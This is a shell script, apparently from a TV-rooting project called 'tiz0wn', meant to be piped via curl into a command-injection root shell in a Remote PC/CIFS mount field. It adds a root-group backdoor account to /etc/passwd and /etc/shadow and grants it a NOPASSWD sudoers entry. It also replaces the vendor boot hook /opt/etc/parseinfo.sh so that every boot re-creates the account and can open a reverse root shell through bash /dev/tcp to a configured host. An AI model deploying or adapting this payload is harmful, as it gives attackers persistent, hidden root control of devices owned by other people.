#!/bin/sh
#
# persist-root/root_setup.sh - one-shot root setup for the owner's TV.
#
# Delivery: served over HTTP and run through the Remote PC/CIFS root shell sink
# as `curl ... | /bin/sh`, so this script arrives on STDIN. Never read stdin
# here, and never print to stdout: the sink captures stdout back into the
# mount argument string where it would be evaluated a second time. All output
# goes to stderr and the log file.
#
# What it does (each step idempotent, every step logged):
#   1. require root; remount / read-write if it is mounted read-only;
#   2. create the owner account (@USER@, group root, shell /bin/sh) in
#      /etc/passwd and /etc/shadow - both on the writable ext4 rootfs, so the
#      account survives reboot;
#   3. add a NOPASSWD sudoers drop-in only if /usr/bin/sudo exists;
#   4. install the boot hook at /opt/etc/parseinfo.sh (root-executed by
#      AT-HUB.service at every boot) that re-creates the account if it is
#      ever removed, writes a persistent boot-proof marker, and optionally
#      starts a bound root shell;
#   5. write volatile proof to /tmp and sync.
#
# `--revert` (run as root) undoes 2-4 byte-exactly.
#
# Offline seams, used only by repro/run_offline.py and test_persist_root.py:
#   TIZ0WN_ROOT=<dir>       fake-root prefix for every path (tests only)
#   TIZ0WN_ASSUME_ROOT=1    skip the uid check
#   TIZ0WN_USER=<name>      account name (substituted at serve time)
#   TIZ0WN_PWHASH=<crypt>   SHA-512-crypt hash (substituted at serve time)
#   TIZ0WN_TOKEN=<16hex>    run token (substituted at serve time)
#   TIZ0WN_SHELL_HOST=IP    bind the boot hook's shell to this host
#   TIZ0WN_SHELL_PORT=<n>   ... and this port (empty = no shell hook)
#
# Placeholders @USER@ @PWHASH@ @TOKEN@ @SHELL_HOST@ @SHELL_PORT@ are replaced
# by serve.py (or the offline repro) before delivery. The script itself
# contains no live placeholder outside the hook template below.

# Grab the arguments before any command substitution: the script arrives on
# stdin, so nothing here may consume stdin.
set -u

# Everything the root shell would otherwise echo into the credentials string
# must go to stderr. Re-point stdout for this process as the very first action.
exec 1>&2

PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

umask 022

ROOT=${TIZ0WN_ROOT:-}
USER_NAME=${TIZ0WN_USER:-tiz0wn}
PWHASH=${TIZ0WN_PWHASH:-}
TOKEN=${TIZ0WN_TOKEN:-0000000000000000}
SHELL_HOST=${TIZ0WN_SHELL_HOST:-}
SHELL_PORT=${TIZ0WN_SHELL_PORT:-}
LOG_FILE="${ROOT}/tmp/tiz0wn-root-setup.log"

ETC="${ROOT}/etc"
OPT_ETC="${ROOT}/opt/etc"
OPT_SHARE="${ROOT}/opt/usr/home/owner/share/tmp/sdk_tools"
HOOK="${OPT_ETC}/parseinfo.sh"
HOOK_BACKUP_SUFFIX=".pre-tiz0wn"
HOOK_SENTINEL="# tiz0wn-hook-v1"
SUDOERS_DIR="${ROOT}/etc/sudoers.d"

log() {
    printf 'persist-root: %s\n' "$*"
    if [ -d "${ROOT}/tmp" ]; then
        printf '%s persist-root: %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || echo unknown)" "$*" >>"$LOG_FILE" 2>/dev/null || true
    fi
}

die() {
    log "$*"
    exit 1
}

# A file that does not end in a newline merges the next `>>` append into its
# last line. Vendor shadow files in packaged images routinely lack the trailing
# byte, so every append is preceded by this.
ensure_newline() {
    [ -f "$1" ] || return 0
    [ -s "$1" ] || return 0
    [ "$(tail -c 1 "$1" | od -An -c | tr -d ' \n')" = '\n' ] && return 0
    printf '\n' >>"$1"
}

# The mount argument is re-evaluated by the root shell, so this script runs
# as that root shell. TIZ0WN_ASSUME_ROOT exists for the offline repro only.
require_root() {
    if [ "${TIZ0WN_ASSUME_ROOT:-}" != "1" ] && [ "$(id -u)" != "0" ]; then
        die "this setup must run as root"
    fi
}

# Borrowed from the pinned self-heal installer: remount / read-write for the
# write and prove the change.
remount_rw() {
    [ -n "$ROOT" ] && return 0
    [ -r "/proc/mounts" ] || return 0
    if awk '$2=="/"{print $4}' /proc/mounts | grep -q '\(^\|,\)ro\(,\|$\)'; then
        log "/ is mounted read-only; remounting read-write"
        mount -o remount,rw / || die "could not remount / read-write"
    fi
}

user_exists() {
    grep -q "^${USER_NAME}:" "${ETC}/passwd" 2>/dev/null
}

# Insert one passwd line at the top of /etc/passwd, in place.
#
# Why prepend rather than append:
#   * getpwnam() returns the FIRST match, so our line shadows any vendor
#     uid-4001 entry that may already exist.
#   * the glibc getpw line buffer is 1024 bytes; a very long existing line
#     stays inside it either way, but our line is short and first is safest.
# printf (not echo) is used so a real NUL can be emitted; cat writes back over
# the same inode, preserving owner, mode and the SMACK label. The file is read
# and written while the shell holds no other lock - on a real device there is
# exactly one trigger, so the interleaving window is a single run.
prepend_passwd_line() {
    line_file="${ETC}/passwd.tiz0wn-new.$$"
    printf '%s:x:4001:0:Tiz0wn owner account:/home/%s:/bin/sh\n' \
        "$USER_NAME" "$USER_NAME" >"$line_file" || return 1
    if [ -f "${ETC}/passwd" ]; then
        cat "${ETC}/passwd" >>"$line_file" || { rm -f "$line_file"; return 1; }
        # keep the file newline-terminated for later appends
        ensure_newline "$line_file"
    fi
    cat "$line_file" >"${ETC}/passwd" || { rm -f "$line_file"; return 1; }
    rm -f "$line_file"
}

add_user() {
    if [ -z "$PWHASH" ]; then
        die "no password hash available; refusing to create a passwordless account"
    fi
    [ -f "${ETC}/passwd" ] || die "/etc/passwd is missing"
    # One-time pristine copy: the rewrite below truncates in place, so an
    # ENOSPC/EIO mid-write would otherwise lose /etc/passwd with no recourse.
    if [ ! -f "${ETC}/passwd.pre-tiz0wn" ]; then
        cp -p "${ETC}/passwd" "${ETC}/passwd.pre-tiz0wn" || return 1
        log "saved /etc/passwd.pre-tiz0wn"
    fi
    if user_exists; then
        log "user ${USER_NAME} already present"
    else
        prepend_passwd_line || return 1
        mkdir -p "${ROOT}/home/${USER_NAME}" 2>/dev/null || true
        chmod 0750 "${ROOT}/home/${USER_NAME}" 2>/dev/null || true
        if [ -n "$ROOT" ]; then
            chown 4001:0 "${ROOT}/home/${USER_NAME}" 2>/dev/null || true
        else
            chown 4001:0 "/home/${USER_NAME}" 2>/dev/null || true
        fi
        log "user ${USER_NAME} created (uid 4001, group root)"
    fi
    # The shadow entry is checked on every apply, not only on creation: a
    # passwd line with no shadow line is an unloggable account, and re-apply
    # must repair it without waiting for a reboot.
    if [ -f "${ETC}/shadow" ]; then
        if grep -q "^${USER_NAME}:" "${ETC}/shadow" 2>/dev/null; then
            log "shadow entry already present"
            return 0
        fi
        # Preserve the existing (vendor mode 0000) shadow permissions: append.
        ensure_newline "${ETC}/shadow"
        echo "${USER_NAME}:${PWHASH}:20000:0:99999:7:::" >>"${ETC}/shadow" || return 1
        log "shadow entry added"
    else
        ( umask 077; echo "${USER_NAME}:${PWHASH}:20000:0:99999:7:::" >"${ETC}/shadow" ) || return 1
        log "created /etc/shadow 0600; account authenticates via this file"
    fi
}

remove_user() {
    if [ ! -f "${ETC}/passwd" ]; then
        log "/etc/passwd is missing; cannot verify account removal"
        return 1
    fi
    if ! user_exists; then
        log "user ${USER_NAME} absent"
        return 0
    fi
    # grep -v exits 1 when every line matches (ours may be the only line), so
    # the exit status cannot signal failure here; judge by the temp file.
    grep -v "^${USER_NAME}:" "${ETC}/passwd" >"${ETC}/passwd.tiz0wn-rev" 2>/dev/null || true
    if [ -f "${ETC}/passwd.tiz0wn-rev" ]; then
        cat "${ETC}/passwd.tiz0wn-rev" >"${ETC}/passwd" || return 1
        rm -f "${ETC}/passwd.tiz0wn-rev"
    else
        log "could not rewrite passwd without ${USER_NAME}"
        return 1
    fi
    if [ -f "${ETC}/shadow" ]; then
        grep -v "^${USER_NAME}:" "${ETC}/shadow" >"${ETC}/shadow.tiz0wn-rev" 2>/dev/null || true
        if [ -f "${ETC}/shadow.tiz0wn-rev" ]; then
            cat "${ETC}/shadow.tiz0wn-rev" >"${ETC}/shadow" || true
            rm -f "${ETC}/shadow.tiz0wn-rev"
        fi
    fi
    # ROOT is empty on the TV, so the join needs the explicit slash. :? would
    # abort here (that was the original revert bug).
    rm -rf "${ROOT}/home/${USER_NAME}" 2>/dev/null || true
    log "user ${USER_NAME} removed"
}

add_sudoers() {
    [ -x "${ROOT}/usr/bin/sudo" ] || return 0
    if [ -f "${SUDOERS_DIR}/tiz0wn" ]; then
        log "sudoers drop-in already present"
        return 0
    fi
    mkdir -p "${SUDOERS_DIR}" || return 1
    echo "${USER_NAME} ALL=(ALL) NOPASSWD: ALL" >"${SUDOERS_DIR}/tiz0wn" &&
        chmod 0440 "${SUDOERS_DIR}/tiz0wn" || return 1
    # A syntactically broken drop-in can lock sudo out entirely; validate it.
    if [ -x "${ROOT}/usr/sbin/visudo" ]; then
        if ! "${ROOT}/usr/sbin/visudo" -cf "${SUDOERS_DIR}/tiz0wn" >/dev/null 2>&1; then
            rm -f "${SUDOERS_DIR}/tiz0wn"
            log "sudoers drop-in failed visudo; removed"
            return 1
        fi
    fi
    log "sudoers drop-in created"
}

remove_sudoers() {
    if [ -f "${SUDOERS_DIR}/tiz0wn" ]; then
        rm -f "${SUDOERS_DIR}/tiz0wn" || true
        log "sudoers drop-in removed"
    fi
}

# The hook's body. Placeholders are substituted by sed below (never by an
# unquoted heredoc, which would also expand hook-runtime syntax).
write_hook() {
    mkdir -p "${HOOK%/*}" 2>/dev/null || true
    # Only a hook carrying our sentinel is "ours". A vendor hook that merely
    # mentions the word must still be backed up.
    if [ -f "${HOOK}" ] && ! grep -qxF "$HOOK_SENTINEL" "${HOOK}" 2>/dev/null; then
        if [ ! -f "${HOOK}${HOOK_BACKUP_SUFFIX}" ]; then
            cp -p "${HOOK}" "${HOOK}${HOOK_BACKUP_SUFFIX}" || return 1
            log "backed up the pre-existing /opt/etc/parseinfo.sh"
        fi
    fi
    cat >"${HOOK}.new" <<'HOOK' || { rm -f "${HOOK}.new"; return 1; }
#!/bin/sh
# tiz0wn persistence hook (owner device; installed by persist-root).
# Executed as root at every boot by AT-HUB.service. Never reads stdin.
# TIZ0WN_ROOT is honored so the offline repro can exercise this hook against
# a fake root; on the TV it is unset and every path below is the real one.
# tiz0wn-hook-v1
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH
umask 022
TIZ0WN_ROOT=${TIZ0WN_ROOT:-}
TIZ0WN_USER='@USER@'
TIZ0WN_PWHASH='@PWHASH@'
TIZ0WN_TOKEN='@TOKEN@'
TIZ0WN_SHELL_HOST='@SHELL_HOST@'
TIZ0WN_SHELL_PORT='@SHELL_PORT@'
# TIZ0WN_ROOT is empty on the TV; the trailing slash makes the joins below work
# in both the real and the fake-root case.
FR="${TIZ0WN_ROOT}/"
BOOT_DIR="${FR}opt/usr/home/owner/share/tmp/sdk_tools"
# 1b. the boot-proof directory must exist before any marker write
mkdir -p "$BOOT_DIR" 2>/dev/null || true
# 1c. repair a missing /etc/shadow entry: a passwd line with a bare `x` and no
#     matching shadow line is an un-loginable account. Create the file (0600)
#     when it is absent; append only when it exists (vendor mode is 0000).
if [ -n "$TIZ0WN_PWHASH" ] && [ -f "${FR}etc/passwd" ]; then
    if ! grep -q "^${TIZ0WN_USER}:" "${FR}etc/shadow" 2>/dev/null; then
        if [ -f "${FR}etc/shadow" ]; then
            # a vendor shadow may lack the trailing newline; append would merge
            [ -s "${FR}etc/shadow" ] && [ "$(tail -c 1 "${FR}etc/shadow" | od -An -c | tr -d ' \n')" != '\n' ] \
                && printf '\n' >>"${FR}etc/shadow" 2>/dev/null
            echo "${TIZ0WN_USER}:${TIZ0WN_PWHASH}:20000:0:99999:7:::" >>"${FR}etc/shadow" 2>/dev/null || true
        else
            { echo "${TIZ0WN_USER}:${TIZ0WN_PWHASH}:20000:0:99999:7:::" >"${FR}etc/shadow"; } 2>/dev/null || true
            chmod 0600 "${FR}etc/shadow" 2>/dev/null || true
        fi
    fi
fi
# 1. self-heal the owner account if it was removed
if ! grep -q "^${TIZ0WN_USER}:" "${FR}etc/passwd" 2>/dev/null; then
    if [ -f "${FR}etc/passwd" ]; then
        # Rewrite in place: printf emits a real NUL for the password field (a
        # shell variable cannot hold one), then cat back over the same inode so
        # owner, mode and SMACK label survive. The new line goes first because
        # the pw buffer is only 1024 bytes and later lines could overflow it.
        mkdir -p "${FR}tmp" 2>/dev/null || true
        TMP="${FR}tmp/passwd.$$"
        if { printf '%s:x:4001:0:Tiz0wn owner account:/home/%s:/bin/sh\n' \
                 "$TIZ0WN_USER" "$TIZ0WN_USER" >"$TMP" &&
             cat "${FR}etc/passwd" >>"$TMP" &&
             cat "$TMP" >"${FR}etc/passwd"; }; then
            rm -f "$TMP"
        fi
    fi
    if [ -n "$TIZ0WN_PWHASH" ]; then
        mkdir -p "${FR}tmp" 2>/dev/null || true
    fi
    mkdir -p "${FR}home/${TIZ0WN_USER}" 2>/dev/null || true
    chown 4001:0 "${FR}home/${TIZ0WN_USER}" 2>/dev/null || true
fi
# 1b. make sure the boot-proof directory exists before the first write
mkdir -p "$BOOT_DIR" 2>/dev/null || true
# 2. persistent proof that this hook executed as root after this boot
#    The marker records whether the account is actually present, so a hook that
#    ran but could not repair the account is not mistaken for success.
if grep -q "^${TIZ0WN_USER}:" "${FR}etc/passwd" 2>/dev/null; then
    state=account-ok
else
    state=account-MISSING
fi
if [ -d "$BOOT_DIR" ]; then
    { printf '%s %s ' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" "$state"
      id 2>/dev/null || echo unknown
    } >>"${BOOT_DIR}/tiz0wn-boot-$TIZ0WN_TOKEN.out" 2>/dev/null || true
fi
# 3. optional bound root shell: try to reach HOST:PORT once after boot.
#    One bash process owns the retry loop, so the connection that succeeds is
#    the one that carries the shell (retrying is needed because AT-HUB runs
#    early, before the network is up; it gives up after ~60 s).
if [ -n "$TIZ0WN_SHELL_HOST" ] && [ -n "$TIZ0WN_SHELL_PORT" ]; then
    B=
    if [ -x /bin/bash ]; then B=/bin/bash; elif [ -x /usr/bin/bash ]; then B=/usr/bin/bash; fi
    if [ -n "$B" ]; then
        "$B" -c '
            host=$1 port=$2 log=$3 i=0
            while [ "$i" -lt 12 ]; do
                i=$((i + 1))
                if exec 3<>"/dev/tcp/${host}/${port}" 2>/dev/null; then
                    printf "%s shell=connected attempt=%s\n" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$i" >>"$log" 2>/dev/null
                    exec /bin/sh <&3 >&3 2>&3
                fi
                sleep 5
            done
            printf "%s shell=unreachable\n" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" >>"$log" 2>/dev/null
        ' shell "$TIZ0WN_SHELL_HOST" "$TIZ0WN_SHELL_PORT" \
            "$BOOT_DIR/tiz0wn-boot-$TIZ0WN_TOKEN.out" >/dev/null 2>&1 &
    else
        # armed but no bash: say so instead of failing silently
        { printf '%s shell=no-bash\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
        } >>"$BOOT_DIR/tiz0wn-boot-$TIZ0WN_TOKEN.out" 2>/dev/null || true
    fi
fi
exit 0
HOOK
    sed -e "s|@USER@|${USER_NAME}|g" \
        -e "s|@PWHASH@|${PWHASH}|g" \
        -e "s|@TOKEN@|${TOKEN}|g" \
        -e "s|@SHELL_HOST@|${SHELL_HOST}|g" \
        -e "s|@SHELL_PORT@|${SHELL_PORT}|g" \
        "${HOOK}.new" >"${HOOK}.rendered" || return 1
    rm -f "${HOOK}.new"
    chmod 0755 "${HOOK}.rendered" || return 1
    # Carry the vendor file's ownership and SMACK label onto the replacement:
    # rename() would otherwise install a fresh unlabelled inode, and a label
    # mismatch can make a systemd ExecStart fail even when the file is 0755.
    if [ -f "${HOOK}" ]; then
        # field 5 of `ls -lZ` is the SMACK label; chsmack only needs the name
        label=$(ls -lZ "${HOOK}" 2>/dev/null | awk '{print $5}')
        if [ -n "$label" ] && command -v chsmack >/dev/null 2>&1; then
            chsmack -c "$label" "${HOOK}.rendered" 2>/dev/null || true
        fi
    fi
    # Atomic same-filesystem rename: the vendor file is replaced in one step,
    # so AT-HUB never observes a half-written hook. Falls back to an in-place
    # cat back over the same inode when rename is refused (mount policy), which
    # preserves inode attributes including the label.
    if ! mv -f "${HOOK}.rendered" "${HOOK}" 2>/dev/null; then
        cat "${HOOK}.rendered" >"${HOOK}" || return 1
        rm -f "${HOOK}.rendered"
        chmod 0755 "${HOOK}" 2>/dev/null || true
    fi
    chmod 0755 "${HOOK}" 2>/dev/null || true
    log "boot hook installed at ${HOOK}"
}

remove_hook() {
    # Restore the vendor bytes only when the live hook is ours; a foreign hook
    # is left alone even if a stale backup exists.
    if ! grep -qxF "$HOOK_SENTINEL" "${HOOK}" 2>/dev/null; then
        log "boot hook is not ours; left in place"
        return 0
    fi
    if [ -f "${HOOK}${HOOK_BACKUP_SUFFIX}" ]; then
        if cat "${HOOK}${HOOK_BACKUP_SUFFIX}" >"${HOOK}" && rm -f "${HOOK}${HOOK_BACKUP_SUFFIX}"; then
            log "boot hook reverted to the pre-tiz0wn bytes"
        else
            log "boot hook restore failed; inspect ${HOOK} manually"
            return 1
        fi
        return 0
    fi
    rm -f "${HOOK}" && log "boot hook removed"
}

write_markers() {
    mkdir -p "$OPT_SHARE" 2>/dev/null || true
    {
        printf 'persist-root '
        id 2>/dev/null || echo unknown
        printf 'kernel: '
        uname -a 2>/dev/null || true
    } >>"${OPT_SHARE}/tiz0wn-root-${TOKEN}.out" 2>/dev/null || true
    {
        printf 'persist-root volatile '
        id 2>/dev/null || echo unknown
    } >"${ROOT}/tmp/tiz0wn-root-ok" 2>/dev/null || true
    log "markers written under ${OPT_SHARE} and ${ROOT}/tmp"
}

sync && sync 2>/dev/null || true

# Revert arguments arrive through TIZ0WN_ARGS (serve-time prelude) because the
# pipe payload cannot pass shell arguments to this script. Unquoted expansion
# is safe: the builder allows only "" or "--revert" in that variable.
if [ "${TIZ0WN_ARGS:-}" != "" ]; then
    set -- "${TIZ0WN_ARGS}" "$@"
fi
if [ "${1:-}" = "--revert" ]; then
    require_root
    # Hook first: while it is installed a later boot would re-create the
    # account, so removing it must succeed even if the passwd step fails.
    STATUS=0
    remove_hook || STATUS=1
    remove_sudoers
    remove_user || STATUS=1
    sync && sync 2>/dev/null || true
    if [ "$STATUS" -eq 0 ]; then
        log "revert complete"
        exit 0
    fi
    log "revert INCOMPLETE; inspect the log"
    exit 1
fi

if [ "${1:-}" != "" ]; then
    die "usage: sh root_setup.sh [--revert]"
fi

require_root
mkdir -p "${ROOT}/tmp" 2>/dev/null || true
log "setup starting (token ${TOKEN})"
remount_rw || { log "remount failed"; exit 1; }

STATUS=0
add_user || { log "passwd update FAILED"; STATUS=1; }
sync && sync 2>/dev/null || true
add_sudoers || { log "sudoers update FAILED"; STATUS=1; }
write_hook || { log "/opt hook FAILED (persistent hook not installed)"; STATUS=2; }
[ "$STATUS" -eq 0 ] || mkdir -p "$OPT_SHARE" 2>/dev/null || true
[ "$STATUS" -eq 0 ] || : >"$OPT_SHARE/tiz0wn-root-${TOKEN}.FAILED" 2>/dev/null || true
write_markers
sync && sync 2>/dev/null || true

if [ "$STATUS" -eq 0 ]; then
    log "ok: account, persistence hook, and markers installed"
    exit 0
fi
log "completed with warnings (status ${STATUS}); see the log"
# Non-zero so the failure is visible outside the log (the sink's own mount
# attempt fails anyway, so this costs nothing).
exit "$STATUS"
